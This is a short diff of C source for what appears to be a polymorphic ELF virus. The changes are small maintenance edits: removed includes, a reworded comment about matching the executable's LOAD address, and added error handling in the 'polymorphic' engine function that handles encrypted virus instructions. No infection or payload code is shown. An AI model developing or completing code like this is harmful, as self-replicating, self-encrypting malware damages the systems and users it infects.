@@ -4,19 +4,14 @@
 #include <time.h>
 #include <string.h>
 #include <unistd.h>
-#include <elf.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/mman.h>
 
 
 /* 
 WARNING: Ensure the default LOAD address of executable match below
-compile once and execute this: readelf -l virus | less
-check the first occurance of LOAD, it should be 0x0000000000400000
+compile once and execute this: readelf -l <executable> | less
+compare the value of first occurance of LOAD with the value of _LOAD_ below, it should be 0x0000000000400000
 
-If different value, update the _LOAD_ value below
+If different value, update the _LOAD_ value below to match the the LOAD value
 */
 #define _LOAD_ 0x0000000000400000
 
@@ -66,6 +61,8 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	{
 		printf("Error in polymorphic engine\n");
 
+		free(string);
+		return 0;
 	}
 
 	// important, remove the file if not the write will fail later on
